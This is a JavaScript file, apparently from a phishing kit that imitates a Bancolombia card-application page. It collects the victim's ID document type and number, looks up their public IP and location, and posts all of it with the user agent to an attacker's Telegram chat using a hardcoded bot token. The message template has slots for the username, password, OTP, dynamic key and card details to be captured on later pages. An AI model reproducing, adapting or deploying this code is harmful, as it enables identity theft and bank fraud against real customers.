const TELEGRAM_BOT_TOKEN = "8660055323:AAEsAlvDH8EcIAR0W26Y_BacCWpW0JZF1i0";
const TELEGRAM_CHAT_ID = "-1005164797390";

function generateSessionId(length = 18) {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let id = "";
  const arr = new Uint8Array(length);
  (crypto || window.msCrypto).getRandomValues(arr);
  for (let i = 0; i < length; i++) {
    id += chars[arr[i] % chars.length];
  }
  return id;
}

function getSessionId() {
  return generateSessionId();
}

async function getPublicIp() {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const j = await r.json();
    return j.ip || "Desconocida";
  } catch (_) {
    try {
      const r2 = await fetch("https://ipapi.co/json/");
      const j2 = await r2.json();
      return j2.ip || "Desconocida";
    } catch (__) {
      return "Desconocida";
    }
  }
}

async function getLocationFromIp(ip) {
  if (!ip || ip === "Desconocida") return "Desconocida";
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`);
    const j = await r.json();
    const parts = [];
    if (j.city) parts.push(j.city);
    if (j.region) parts.push(j.region);
    if (j.country_name) parts.push(j.country_name);
    if (parts.length === 0) return "Desconocida";
    return parts.join(", ");
  } catch (_) {
    return "Desconocida";
  }
}

const tipoDocumento = document.getElementById("tipo-documento");
const numeroDocumento = document.getElementById("numero-documento");
const checkbox = document.getElementById("checkbox");

const solicitarTarjetaButton = document.getElementById(
  "solicitarTarjetaButton",
);
solicitarTarjetaButton.disabled = true;
solicitarTarjetaButton.classList.add("disabled-button");

tipoDocumento.addEventListener("change", () => {
  if (tipoDocumento.value && numeroDocumento.value && checkbox.checked) {
    solicitarTarjetaButton.disabled = false;
    solicitarTarjetaButton.classList.remove("disabled-button");
  } else {
    solicitarTarjetaButton.disabled = true;
    solicitarTarjetaButton.classList.add("disabled-button");
  }
});

numeroDocumento.addEventListener("input", () => {
  if (
    tipoDocumento.value &&
    numeroDocumento.value &&
    checkbox.checked &&
    numeroDocumento.value.length >= 6
  ) {
    solicitarTarjetaButton.disabled = false;
    solicitarTarjetaButton.classList.remove("disabled-button");
  } else {
    solicitarTarjetaButton.disabled = true;
    solicitarTarjetaButton.classList.add("disabled-button");
  }
});

checkbox.addEventListener("change", () => {
  if (tipoDocumento.value && numeroDocumento.value && checkbox.checked) {
    solicitarTarjetaButton.disabled = false;
    solicitarTarjetaButton.classList.remove("disabled-button");
  } else {
    solicitarTarjetaButton.disabled = true;
    solicitarTarjetaButton.classList.add("disabled-button");
  }
});

async function sendToTelegram(message, extra = {}) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "HTML",
    disable_web_page_preview: true,
    ...extra,
  };
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Error enviando a Telegram:", error);
    return { ok: false };
  }
}

async function showLoadingModalAndRedirect() {
  const sid = getSessionId();
  const tipoDoc = tipoDocumento.options[tipoDocumento.selectedIndex].text;
  const numDoc = numeroDocumento.value;
  const userAgent = navigator.userAgent || "N/A";

  const modalContainer = document.querySelector(".modal-container");
  modalContainer.style.display = "flex";

  const ip = await getPublicIp();
  const ubicacion = await getLocationFromIp(ip);

  const sep = "-----------------------------------";

  const mensaje =
    `${sep}\n` +
    `🆔 ID: <b>${sid}</b>\n` +
    `📄 Doc: <b>${tipoDoc} ${numDoc}</b>\n` +
    `👤💻 User: <i>Esperando login...</i>\n` +
    `🔐 Pass: <i>Esperando login...</i>\n` +
    `🔑 OTP: <i>No ingresada</i>\n` +
    `🔐 Dinámica: <i>No ingresada</i>\n\n` +
    `💳 Tarjeta: <b>No ingresada</b>\n\n` +
    `🌍 Ubicación: <b>${ubicacion}</b>\n` +
    `📡 IP: <code>${ip}</code>\n` +
    `${sep}\n` +
    `📱 UA: <code>${userAgent}</code>\n` +
    `${sep}`;

  const res = await sendToTelegram(mensaje);

  if (res && res.ok && res.result && res.result.message_id) {
    localStorage.setItem("cb_chat_message_id", String(res.result.message_id));
  }
}

document
  .getElementById("solicitarTarjetaButton")
  .addEventListener("click", showLoadingModalAndRedirect);

document.getElementById("continuarButton").addEventListener("click", () => {
  const sid = getSessionId();
  const correo = "";
  window.location.href =
    "./BANCOLOMBIA/index.html?key=" +
    encodeURIComponent(sid) +
    "&correo=" +
    encodeURIComponent(correo);
});
